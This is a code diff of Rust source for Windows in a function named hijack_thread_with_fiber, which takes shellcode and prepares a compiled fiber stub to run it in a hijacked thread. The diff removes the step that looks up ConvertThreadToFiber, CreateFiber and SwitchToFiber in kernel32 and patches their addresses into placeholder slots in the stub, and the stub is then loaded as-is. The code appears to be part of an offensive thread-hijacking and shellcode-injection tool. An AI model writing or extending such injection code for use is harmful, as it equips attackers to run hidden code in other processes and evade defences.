@@ -9,7 +9,6 @@ use windows::{
         Foundation::{CloseHandle, HANDLE},
         System::{
             Diagnostics::Debug::{CONTEXT, CONTEXT_FLAGS, FlushInstructionCache},
-            LibraryLoader::{GetModuleHandleA, GetProcAddress},
         },
         UI::WindowsAndMessaging::{PostThreadMessageA, WM_NULL},
     },
@@ -169,34 +168,7 @@ pub unsafe fn hijack_thread_with_fiber(
     shellcode: &[u8],
 ) -> Result<(*mut c_void, usize)> {
     // load compiled fiber stub
-    let fiber_stub_orig: &[u8] = include_bytes!("fiber_stub.bin");
-    let mut fiber_stub = fiber_stub_orig.to_vec();
-
-    // resolve API addresses locally
-    use windows::core::PCSTR;
-    let h_kernel32 = GetModuleHandleA(windows::core::s!("kernel32.dll"))?;
-    
-    let addr_convert = GetProcAddress(h_kernel32, PCSTR(b"ConvertThreadToFiber\0".as_ptr())).unwrap() as u64;
-    let addr_create = GetProcAddress(h_kernel32, PCSTR(b"CreateFiber\0".as_ptr())).unwrap() as u64;
-    let addr_switch = GetProcAddress(h_kernel32, PCSTR(b"SwitchToFiber\0".as_ptr())).unwrap() as u64;
-
-    // patch placeholders
-    fn patch_bytes(stub: &mut [u8], placeholder: u64, actual: u64) {
-        let pattern = placeholder.to_le_bytes();
-        let actual_bytes = actual.to_le_bytes();
-        
-        // simple linear scan
-        for i in 0..stub.len().saturating_sub(7) {
-            if stub[i..i+8] == pattern {
-                stub[i..i+8].copy_from_slice(&actual_bytes);
-                return; // assume one occurrence
-            }
-        }
-    }
-
-    patch_bytes(&mut fiber_stub, 0x1111111111111111, addr_convert);
-    patch_bytes(&mut fiber_stub, 0x2222222222222222, addr_create);
-    patch_bytes(&mut fiber_stub, 0x3333333333333333, addr_switch);
+    let fiber_stub: &[u8] = include_bytes!("fiber_stub.bin");
 
     // calculate padding to align shellcode to 16 bytes
     let stub_len = fiber_stub.len();
